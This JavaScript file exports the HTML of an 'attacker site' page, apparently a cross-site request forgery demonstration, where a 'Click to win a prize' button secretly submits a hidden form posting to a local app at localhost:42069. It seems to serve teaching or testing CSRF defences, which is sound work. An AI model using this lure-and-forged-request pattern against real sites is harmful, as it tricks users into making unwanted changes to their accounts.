export const index = () => {
  return `
 <!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Simple Landing Page</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
    }

    nav {
      background-color: #333;
      color: white;
      padding: 10px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    nav a {
      color: white;
      text-decoration: none;
      margin-right: 15px;
    }

    nav a:last-child {
      margin-right: 0;
    }

    .main {
      text-align: center;
      padding: 100px 20px;
    }

    .main h1 {
      font-size: 48px;
      color: #333;
    }

    .main p {
      font-size: 18px;
      color: #666;
      margin-top: 10px;
    }

    .main a {
      display: inline-block;
      margin-top: 30px;
      background-color: #333;
      color: white;
      padding: 10px 25px;
      text-decoration: none;
      border-radius: 5px;
    }
  </style>
</head>

<body>
  <div class="main">
    <h1>Hello, welcome to the attacker site</h1>
    <p>We’re glad to have you here.</p>
    <button>Click to win a prize</button>
    <form action="http://localhost:42069/posts" method="post">
      <input type="hidden" name="title" value="HTMX sucks"  required />
    </form>
  </div>

  <script>
    const form = document.querySelector('form');
    const button = document.querySelector('button');
    button.addEventListener('click', ()=>{form.submit()});

  </script>
</body>

</html> 
  `;
};
